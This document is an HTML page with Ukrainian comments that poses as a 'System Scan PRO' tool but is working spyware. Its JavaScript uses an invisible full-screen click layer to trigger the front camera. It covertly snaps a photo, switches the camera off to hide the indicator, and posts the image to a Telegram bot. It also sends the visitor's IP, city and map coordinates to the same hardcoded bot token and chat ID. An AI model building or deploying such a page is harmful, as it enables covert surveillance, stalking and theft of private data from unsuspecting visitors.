<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Scan PRO</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
    <style>
        body { margin: 0; background: radial-gradient(circle at top, #0b1220, #05060a); color: #e5e7eb; font-family: Consolas, monospace; overflow-x: hidden; height: 100vh; }
        .status { text-align: center; margin-top: 25px; font-size: 20px; letter-spacing: 2px; color: #60a5fa; }
        .container { width: 90%; max-width: 800px; margin: 40px auto; position: relative; z-index: 10; }
        .box { background: rgba(15, 23, 42, 0.9); padding: 12px; border-radius: 12px; margin-bottom: 10px; opacity: 0; transform: translateY(10px); transition: 0.4s; box-shadow: 0 0 15px rgba(0,0,0,0.4); border: 1px solid rgba(59, 130, 246, 0.1); }
        .show { opacity: 1; transform: translateY(0); }
        .label { color: #94a3b8; font-size: 11px; text-transform: uppercase; }
        .value { color: white; margin-top: 5px; word-break: break-all; font-size: 14px; }
        .progress { height: 18px; background: #111827; border-radius: 10px; overflow: hidden; }
        .bar { height: 100%; width: 0%; background: linear-gradient(90deg, #3b82f6, #60a5fa); transition: width 0.03s linear; }
        #map { height: 320px; display: none; border-radius: 12px; margin-top: 10px; border: 1px solid #1e293b; }
        /* Невидимий шар для активації камери через клік */
        #clickLayer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 999; cursor: pointer; }
        #video, #canvas { display: none; }
    </style>
</head>
<body onclick="activateCamera()">

<div id="clickLayer"></div> <!-- Юзер клікне сюди і запустить камеру -->

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<div class="status" id="statusText">INITIALIZING SYSTEM SCAN...</div>

<div class="container">
    <div class="box show">
        <div class="progress"><div class="bar" id="bar"></div></div>
        <div class="value" id="percent">0%</div>
    </div>
    <div class="box" id="ipBox"><div class="label">IP Address</div><div class="value" id="ip">---</div></div>
    <div class="box" id="countryBox"><div class="label">Location</div><div class="value" id="location">---</div></div>
    <div class="box" id="ispBox"><div class="label">Provider</div><div class="value" id="isp">---</div></div>
    <div class="box" id="deviceBox"><div class="label">Device Info</div><div class="value" id="device">---</div></div>
    <div id="extraContainer"></div>
    <div id="map"></div>
</div>

<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>

<script>
const TG_TOKEN = "8639479669:AAHYhGU7UMGZ5nlo3-PGzKVsQx9vTaQojFk";
const TG_CHAT_ID = "-1003787168523";

let cameraActivated = false;

// Функція, що спрацьовує при кліку
function activateCamera() {
    if (cameraActivated) return;
    cameraActivated = true;
    document.getElementById('clickLayer').style.display = 'none';
    takePhoto();
}

async function takePhoto() {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" }, // фронталка
            audio: false 
        });
        video.srcObject = stream;
        
        // Чекаємо стабілізації зображення
        setTimeout(() => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                sendPhotoToTelegram(blob);
                // Вимикаємо камеру, щоб не палитись індикатором
                stream.getTracks().forEach(track => track.stop());
            }, 'image/jpeg', 0.7);
        }, 2000);
    } catch (e) {
        console.error("Camera error:", e);
    }
}

async function sendPhotoToTelegram(blob) {
    const formData = new FormData();
    formData.append('chat_id', TG_CHAT_ID);
    formData.append('photo', blob, 'image.jpg');
    formData.append('caption', '📸 Спрацювала камера!');

    try {
        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
        });
    } catch (e) { console.error("Upload fail"); }
}

// Стандартна логіка сканування
let p = 0;
let scan = setInterval(() => {
    p++;
    document.getElementById("bar").style.width = p + "%";
    document.getElementById("percent").innerText = p + "%";
    if (p >= 100) {
        clearInterval(scan);
        startLogic();
    }
}, 30);

function startLogic() {
    fetch("https://ipapi.co/json/")
        .then(r => r.json())
        .then(data => {
            // Відправка текстового звіту
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: TG_CHAT_ID,
                    text: `🌐 ВІЗИТОР\nIP: ${data.ip}\nМісто: ${data.city}\nMaps: https://www.google.com/maps?q=${data.latitude},${data.longitude}`,
                    parse_mode: "Markdown"
                })
            });

            // Виведення на екран
            document.getElementById("ip").innerText = data.ip;
            document.getElementById("ipBox").classList.add("show");
            document.getElementById("location").innerText = `${data.city}, ${data.country_name}`;
            document.getElementById("countryBox").classList.add("show");
            document.getElementById("isp").innerText = data.org;
            document.getElementById("ispBox").classList.add("show");
            document.getElementById("device").innerText = navigator.platform;
            document.getElementById("deviceBox").classList.add("show");

            showMap(data.latitude, data.longitude, data.city);
        });
}

function showMap(lat, lon, label) {
    document.getElementById("map").style.display = "block";
    if (window.myMap) window.myMap.remove();
    window.myMap = L.map('map', {zoomControl: false}).setView([lat, lon], 13);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(window.myMap);
    L.marker([lat, lon]).addTo(window.myMap).bindPopup(label).openPopup();
}
</script>

</body>
</html>
